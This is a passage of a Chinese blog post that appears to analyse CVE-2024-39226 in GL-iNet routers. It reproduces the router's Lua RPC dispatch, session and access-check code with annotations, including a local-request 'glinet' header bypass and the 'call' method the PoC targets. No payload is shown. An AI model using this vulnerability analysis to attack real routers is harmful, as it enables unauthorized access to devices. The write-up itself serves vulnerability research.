punctuation\">)</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>        <span class=\"token keyword\">return</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>    <span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>    <span class=\"token keyword\">if</span> args <span class=\"token keyword\">and</span> <span class=\"token function\">type</span><span class=\"token punctuation\">(</span>args<span class=\"token punctuation\">)</span> <span class=\"token operator\">~=</span> <span class=\"token string\">\"table\"</span> <span class=\"token keyword\">then</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>        <span class=\"token keyword\">local</span> resp <span class=\"token operator\">=</span> rpc<span class=\"token punctuation\">.</span><span class=\"token function\">error_response</span><span class=\"token punctuation\">(</span>id<span class=\"token punctuation\">,</span> rpc<span class=\"token punctuation\">.</span>ERROR_CODE_INVALID_PARAMS<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>        ngx<span class=\"token punctuation\">.</span><span class=\"token function\">say</span><span class=\"token punctuation\">(</span>cjson<span class=\"token punctuation\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>resp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>        <span class=\"token keyword\">return</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>    <span class=\"token keyword\">end</span> <span class=\"token comment\">-- 参数校验：检查 sid、object、method 类型，args 是否为表。</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>    ngx<span class=\"token punctuation\">.</span>ctx<span class=\"token punctuation\">.</span>sid <span class=\"token operator\">=</span> sid</pre></td></tr><tr><td data-num=\"94\"></td><td><pre></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> rpc<span class=\"token punctuation\">.</span><span class=\"token function\">is_no_auth</span><span class=\"token punctuation\">(</span>object<span class=\"token punctuation\">,</span> method<span class=\"token punctuation\">)</span> <span class=\"token keyword\">then</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>        <span class=\"token comment\">-- rpc.is_no_auth (object, method)：跳过认证的方法（如公共 API）。</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> rpc<span class=\"token punctuation\">.</span><span class=\"token function\">access</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"rpc\"</span><span class=\"token punctuation\">,</span> object <span class=\"token operator\">..</span> <span class=\"token string\">\".\"</span> <span class=\"token operator\">..</span> method<span class=\"token punctuation\">)</span> <span class=\"token keyword\">then</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>            <span class=\"token comment\">-- rpc.access (\"rpc\", object .. \".\" .. method)：验证调用权限。</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>            <span class=\"token keyword\">local</span> resp <span class=\"token operator\">=</span> rpc<span class=\"token punctuation\">.</span><span class=\"token function\">error_response</span><span class=\"token punctuation\">(</span>id<span class=\"token punctuation\">,</span> rpc<span class=\"token punctuation\">.</span>ERROR_CODE_ACCESS<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>            ngx<span class=\"token punctuation\">.</span><span class=\"token function\">say</span><span class=\"token punctuation\">(</span>cjson<span class=\"token punctuation\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>resp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>            <span class=\"token keyword\">return</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>        <span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>    <span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>    <span class=\"token keyword\">local</span> res <span class=\"token operator\">=</span> rpc<span class=\"token punctuation\">.</span><span class=\"token function\">call</span><span class=\"token punctuation\">(</span>object<span class=\"token punctuation\">,</span> method<span class=\"token punctuation\">,</span> args<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>    <span class=\"token comment\">-- 调用目标方法：通过 rpc.call 执行实际逻辑，返回结果或错误。</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token function\">type</span><span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token string\">\"number\"</span> <span class=\"token keyword\">then</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre>        <span class=\"token keyword\">local</span> resp <span class=\"token operator\">=</span> rpc<span class=\"token punctuation\">.</span><span class=\"token function\">error_response</span><span class=\"token punctuation\">(</span>id<span class=\"token punctuation\">,</span> res<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>        ngx<span class=\"token punctuation\">.</span><span class=\"token function\">say</span><span class=\"token punctuation\">(</span>cjson<span class=\"token punctuation\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>resp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>        <span class=\"token keyword\">return</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>    <span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token function\">type</span><span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">)</span> <span class=\"token operator\">~=</span> <span class=\"token string\">\"table\"</span> <span class=\"token keyword\">then</span> res <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>    <span class=\"token keyword\">local</span> resp <span class=\"token operator\">=</span> rpc<span class=\"token punctuation\">.</span><span class=\"token function\">result_response</span><span class=\"token punctuation\">(</span>id<span class=\"token punctuation\">,</span> res<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>    ngx<span class=\"token punctuation\">.</span><span class=\"token function\">say</span><span class=\"token punctuation\">(</span>cjson<span class=\"token punctuation\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>resp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre><span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre></pre></td></tr><tr><td data-num=\"119\"></td><td><pre><span class=\"token keyword\">local</span> methods<span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"120\"></td><td><pre>    <span class=\"token punctuation\">[</span><span class=\"token string\">\"challenge\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> rpc_method_challenge<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"121\"></td><td><pre>    <span class=\"token punctuation\">[</span><span class=\"token string\">\"login\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> rpc_method_login<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"122\"></td><td><pre>    <span class=\"token punctuation\">[</span><span class=\"token string\">\"logout\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> rpc_method_logout<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"123\"></td><td><pre>    <span class=\"token punctuation\">[</span><span class=\"token string\">\"alive\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> rpc_method_alive<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"124\"></td><td><pre>    <span class=\"token punctuation\">[</span><span class=\"token string\">\"call\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> rpc_method_call</pre></td></tr><tr><td data-num=\"125\"></td><td><pre><span class=\"token punctuation\">&#125;</span> <span class=\"token comment\">--RPC 方法：challenge、login、logout、alive、call</span></pre></td></tr><tr><td data-num=\"126\"></td><td><pre></pre></td></tr><tr><td data-num=\"127\"></td><td><pre><span class=\"token keyword\">local</span> ok<span class=\"token punctuation\">,</span> json_data <span class=\"token operator\">=</span> <span class=\"token function\">pcall</span><span class=\"token punctuation\">(</span>cjson<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"128\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> ok <span class=\"token keyword\">then</span></pre></td></tr><tr><td data-num=\"129\"></td><td><pre>    <span class=\"token keyword\">local</span> resp <span class=\"token operator\">=</span> rpc<span class=\"token punctuation\">.</span><span class=\"token function\">error_response</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">nil</span><span class=\"token punctuation\">,</span> rpc<span class=\"token punctuation\">.</span>ERROR_CODE_PARSE_ERROR<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"130\"></td><td><pre>    ngx<span class=\"token punctuation\">.</span><span class=\"token function\">say</span><span class=\"token punctuation\">(</span>cjson<span class=\"token punctuation\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>resp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"131\"></td><td><pre>    <span class=\"token keyword\">return</span></pre></td></tr><tr><td data-num=\"132\"></td><td><pre><span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"133\"></td><td><pre></pre></td></tr><tr><td data-num=\"134\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token function\">type</span><span class=\"token punctuation\">(</span>json_data<span class=\"token punctuation\">)</span> <span class=\"token operator\">~=</span> <span class=\"token string\">\"table\"</span> <span class=\"token keyword\">then</span></pre></td></tr><tr><td data-num=\"135\"></td><td><pre>    <span class=\"token keyword\">local</span> resp <span class=\"token operator\">=</span> rpc<span class=\"token punctuation\">.</span><span class=\"token function\">error_response</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">nil</span><span class=\"token punctuation\">,</span> rpc<span class=\"token punctuation\">.</span>ERROR_CODE_PARSE_ERROR<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"136\"></td><td><pre>    ngx<span class=\"token punctuation\">.</span><span class=\"token function\">say</span><span class=\"token punctuation\">(</span>cjson<span class=\"token punctuation\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>resp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"137\"></td><td><pre>    <span class=\"token keyword\">return</span></pre></td></tr><tr><td data-num=\"138\"></td><td><pre><span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"139\"></td><td><pre></pre></td></tr><tr><td data-num=\"140\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token function\">type</span><span class=\"token punctuation\">(</span>json_data<span class=\"token punctuation\">.</span>method<span class=\"token punctuation\">)</span> <span class=\"token operator\">~=</span> <span class=\"token string\">\"string\"</span> <span class=\"token keyword\">then</span></pre></td></tr><tr><td data-num=\"141\"></td><td><pre>    <span class=\"token keyword\">local</span> resp <span class=\"token operator\">=</span> rpc<span class=\"token punctuation\">.</span><span class=\"token function\">error_response</span><span class=\"token punctuation\">(</span>json_data<span class=\"token punctuation\">.</span>id<span class=\"token punctuation\">,</span> rpc<span class=\"token punctuation\">.</span>ERROR_CODE_INVALID_REQUEST<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"142\"></td><td><pre>    ngx<span class=\"token punctuation\">.</span><span class=\"token function\">say</span><span class=\"token punctuation\">(</span>cjson<span class=\"token punctuation\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>resp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"143\"></td><td><pre>    <span class=\"token keyword\">return</span></pre></td></tr><tr><td data-num=\"144\"></td><td><pre><span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"145\"></td><td><pre></pre></td></tr><tr><td data-num=\"146\"></td><td><pre><span class=\"token keyword\">if</span> json_data<span class=\"token punctuation\">.</span>params <span class=\"token keyword\">and</span> <span class=\"token function\">type</span><span class=\"token punctuation\">(</span>json_data<span class=\"token punctuation\">.</span>params<span class=\"token punctuation\">)</span> <span class=\"token operator\">~=</span> <span class=\"token string\">\"table\"</span> <span class=\"token keyword\">then</span></pre></td></tr><tr><td data-num=\"147\"></td><td><pre>    <span class=\"token keyword\">local</span> resp <span class=\"token operator\">=</span> rpc<span class=\"token punctuation\">.</span><span class=\"token function\">error_response</span><span class=\"token punctuation\">(</span>json_data<span class=\"token punctuation\">.</span>id<span class=\"token punctuation\">,</span> rpc<span class=\"token punctuation\">.</span>ERROR_CODE_INVALID_REQUEST<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"148\"></td><td><pre>    ngx<span class=\"token punctuation\">.</span><span class=\"token function\">say</span><span class=\"token punctuation\">(</span>cjson<span class=\"token punctuation\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>resp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"149\"></td><td><pre>    <span class=\"token keyword\">return</span></pre></td></tr><tr><td data-num=\"150\"></td><td><pre><span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"151\"></td><td><pre></pre></td></tr><tr><td data-num=\"152\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> methods<span class=\"token punctuation\">[</span>json_data<span class=\"token punctuation\">.</span>method<span class=\"token punctuation\">]</span> <span class=\"token keyword\">then</span></pre></td></tr><tr><td data-num=\"153\"></td><td><pre>    <span class=\"token keyword\">local</span> resp <span class=\"token operator\">=</span> rpc<span class=\"token punctuation\">.</span><span class=\"token function\">error_response</span><span class=\"token punctuation\">(</span>json_data<span class=\"token punctuation\">.</span>id<span class=\"token punctuation\">,</span> rpc<span class=\"token punctuation\">.</span>ERROR_CODE_METHOD_NOT_FOUND<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"154\"></td><td><pre>    ngx<span class=\"token punctuation\">.</span><span class=\"token function\">say</span><span class=\"token punctuation\">(</span>cjson<span class=\"token punctuation\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>resp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"155\"></td><td><pre>    <span class=\"token keyword\">return</span></pre></td></tr><tr><td data-num=\"156\"></td><td><pre><span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"157\"></td><td><pre></pre></td></tr><tr><td data-num=\"158\"></td><td><pre>methods<span class=\"token punctuation\">[</span>json_data<span class=\"token punctuation\">.</span>method<span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span>json_data<span class=\"token punctuation\">.</span>id<span class=\"token punctuation\">,</span> json_data<span class=\"token punctuation\">.</span>params <span class=\"token keyword\">or</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>根据 POC 调用的方法为 call</p>\n<p><img data-src=\"imgimg/GL-iNet_%E8%B7%AF%E7%94%B1%E5%99%A8_CVE-2024-39226/image-20250320181029229.png\" alt=\"image-20250320181029229\"></p>\n<p>所以现在重点关注 rpc_method_call 这个功能类函数</p>\n<p><img data-src=\"imgimg/GL-iNet_%E8%B7%AF%E7%94%B1%E5%99%A8_CVE-2024-39226/image-20250320181152512.png\" alt=\"image-20250320181152512\"></p>\n<p>rpc_method_call 进行参数验证、会话检查和 Ubus 调用：</p>\n<ol>\n<li>确保 params 中至少三个元素且元素类型正确。</li>\n<li>检查 sid 是否有效，并通过 rpc.access 验证访问权限。</li>\n<li>如果上述判断均通过，使用 rpc.call 执行指定的 Ubus 对象和方法。</li>\n</ol>\n<p>接下来跟进 access 和 call 方法</p>\n<figure class=\"highlight lua\"><figcaption data-lang=\"lua\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>M<span class=\"token punctuation\">.</span>session <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">local</span> session <span class=\"token operator\">=</span> ubus<span class=\"token punctuation\">.</span><span class=\"token function\">call</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"gl-session\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"session\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">&#123;</span> sid <span class=\"token operator\">=</span> ngx<span class=\"token punctuation\">.</span>ctx<span class=\"token punctuation\">.</span>sid <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">local</span> __oui_session <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        is_local <span class=\"token operator\">=</span> ngx<span class=\"token punctuation\">.</span>var<span class=\"token punctuation\">.</span>remote_addr <span class=\"token operator\">==</span> <span class=\"token string\">\"127.0.0.1\"</span> <span class=\"token keyword\">or</span> ngx<span class=\"token punctuation\">.</span>var<span class=\"token punctuation\">.</span>remote_addr <span class=\"token operator\">==</span> <span class=\"token string\">\"::1\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token comment\">-- is_local 为本地</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        remote_addr <span class=\"token operator\">=</span> ngx<span class=\"token punctuation\">.</span>var<span class=\"token punctuation\">.</span>remote_addr<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        remote_port <span class=\"token operator\">=</span> ngx<span class=\"token punctuation\">.</span>var<span class=\"token punctuation\">.</span>remote_port</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> session <span class=\"token keyword\">then</span> <span class=\"token keyword\">return</span> __oui_session <span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    utils<span class=\"token punctuation\">.</span><span class=\"token function\">update_ngx_session</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/tmp/gl_token_\"</span> <span class=\"token operator\">..</span> ngx<span class=\"token punctuation\">.</span>ctx<span class=\"token punctuation\">.</span>sid<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    session<span class=\"token punctuation\">.</span>remote_addr <span class=\"token operator\">=</span> ngx<span class=\"token punctuation\">.</span>var<span class=\"token punctuation\">.</span>remote_addr</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    session<span class=\"token punctuation\">.</span>remote_port <span class=\"token operator\">=</span> ngx<span class=\"token punctuation\">.</span>var<span class=\"token punctuation\">.</span>remote_port</pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">return</span> session</pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>M<span class=\"token punctuation\">.</span>access <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span>scope<span class=\"token punctuation\">,</span> entry<span class=\"token punctuation\">,</span> need<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">local</span> headers <span class=\"token operator\">=</span> ngx<span class=\"token punctuation\">.</span>req<span class=\"token punctuation\">.</span><span class=\"token function\">get_headers</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">local</span> s <span class=\"token operator\">=</span> M<span class=\"token punctuation\">.</span><span class=\"token function\">session</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">local</span> aclgroup <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span>aclgroup</pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">if</span> s<span class=\"token punctuation\">.</span>is_local <span class=\"token keyword\">and</span> headers<span class=\"token punctuation\">[</span><span class=\"token string\">\"glinet\"</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">then</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token comment\">-- 判断是否本地请求并且使用 glinet 服务，则通过</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token keyword\">true</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token comment\">-- The admin acl group is always allowed</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token keyword\">if</span> aclgroup <span class=\"token operator\">==</span> <span class=\"token string\">\"root\"</span> <span class=\"token keyword\">then</span> <span class=\"token keyword\">return</span> <span class=\"token keyword\">true</span> <span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> aclgroup <span class=\"token keyword\">or</span> aclgroup <span class=\"token operator\">==</span> <span class=\"token string\">\"\"</span> <span class=\"token keyword\">then</span> <span class=\"token keyword\">return</span> <span class=\"token keyword\">false</span> <span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token keyword\">local</span> perm <span class=\"token operator\">=</span> db<span class=\"token punctuation\">.</span><span class=\"token function\">get_perm</span><span class=\"token punctuation\">(</span>aclgroup<span class=\"token punctuation\">,</span> scope<span class=\"token punctuation\">,</span> entry<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> need <span class=\"token keyword\">then</span> <span class=\"token keyword\">return</span> <span class=\"token keyword\">false</span> <span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token keyword\">if</span> need <span class=\"token operator\">==</span> <span class=\"token string\">\"r\"</span> <span class=\"token keyword\">then</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>        <span class=\"token keyword\">return</span> perm<span class=\"token punctuation\">:</span><span class=\"token function\">find</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[r,w]\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">~=</span> <span class=\"token keyword\">nil</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>        <span class=\"token keyword\">return</span> perm<span class=\"token punctuation\">:</span><span class=\"token function\">find</span><span class=\"token punctuation\">(</span>need<span class=\"token punctuation\">)</span> <span class=\"token operator\">~=</span> <span class=\"token keyword\">nil</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>M<span class=\"token punctuation\">.</span>call <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span>object<span class=\"token punctuation\">,</span> method<span class=\"token punctuation\">,</span> args<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    ngx<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>ngx<span class=\"token punctuation\">.</span>DEBUG<span class=\"token punctuation\">,</span> <span class=\"token string\">\"call: '\"</span><span class=\"token punctuation\">,</span> object<span class=\"token punctuation\">,</span> <span class=\"token string\">\".\"</span><span class=\"token punctuation\">,</span> method<span class=\"token punctuation\">,</span> <span class=\"token string\">\"'\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> objects<span class=\"token punctuation\">[</span>object<span class=\"token punctuation\">]</span> <span class=\"token keyword\">then</span> <span class=\"token comment\">-- 如果没有属性加载就从 /usr/lib/oui-httpd/rpc/ 加载脚本</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>        <span class=\"token keyword\">local</span> script <span class=\"token operator\">=</span> <span class=\"token string\">\"/usr/lib/oui-httpd/rpc/\"</span> <span class=\"token operator\">..</span> object</pre></td></tr><tr><td data-num=\"52\"></td><td><pre>        <span class=\"token comment\">-- 如果脚本文件存在且加载成功，将对象的方法注册到 objects 表中。</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> fs<span class=\"token punctuation\">.</span><span class=\"token function\">access</span><span class=\"token punctuation\">(</span>script<span class=\"token punctuation\">)</span> <span class=\"token keyword\">then</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>            <span class=\"token comment\">-- 如果无法从 /usr/lib/oui-httpd/rpc/ 目录下加载脚本文件或者找不到对象或方法。</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token function\">glc_call</span><span class=\"token punctuation\">(</span>object<span class=\"token punctuation\">,</span> method<span class=\"token punctuation\">,</span> args<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>            <span class=\"token comment\">-- 则调用 glc_call 执行。</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>        <span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>        <span class=\"token keyword\">local</span> ok<span class=\"token punctuation\">,</span> tb <span class=\"token operator\">=</span> <span class=\"token function\">pcall</span><span class=\"token punctuation\">(</span>dofile<span class=\"token punctuation\">,</span> script<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> ok <span class=\"token keyword\">then</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>            ngx<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>ngx<span class=\"token punctuation\">.</span>ERR<span class=\"token punctuation\">,</span> tb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token function\">glc_call</span><span class=\"token punctuation\">(</span>object<span class=\"token punctuation\">,</span> method<span class=\"token punctuation\">,</span> args<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>        <span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token function\">type</span><span class=\"token punctuation\">(</span>tb<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token string\">\"table\"</span> <span class=\"token keyword\">then</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>            <span class=\"token keyword\">local</span> funs <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>            <span class=\"token keyword\">for</span> k<span class=\"token punctuation\">,</span> v <span class=\"token keyword\">in</span> <span class=\"token function\">pairs</span><span class=\"token punctuation\">(</span>tb<span class=\"token punctuation\">)</span> <span class=\"token keyword\">do</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>                <span class=\"token keyword\">if</span> <span class=\"token function\">type</span><span class=\"token punctuation\">(</span>v<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token string\">\"function\"</span> <span class=\"token keyword\">then</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>                    funs<span class=\"token punctuation\">[</span>k<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v</pre></td></tr><tr><td data-num=\"70\"></td><td><pre>                <span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>            <span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>            objects<span class=\"token punctuation\">[</span>object<span 